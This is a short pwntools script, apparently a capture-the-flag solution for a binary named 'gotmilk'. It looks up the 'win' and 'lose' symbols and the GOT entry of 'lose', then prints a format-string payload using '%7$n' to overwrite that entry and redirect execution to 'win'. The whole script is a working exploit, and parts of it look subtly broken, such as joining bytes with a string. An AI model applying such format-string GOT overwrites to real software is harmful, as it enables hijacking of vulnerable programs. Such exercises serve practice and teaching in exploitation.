from pwn import *

lib = ELF('libmylib.so')
win = lib.symbols['win']
lose = lib.symbols['lose']


e = ELF('gotmilk')
got_lose = e.got['lose']


print(hex(got_lose))
print(p64(got_lose)+'%' + str(win-8) + 'x%7$n')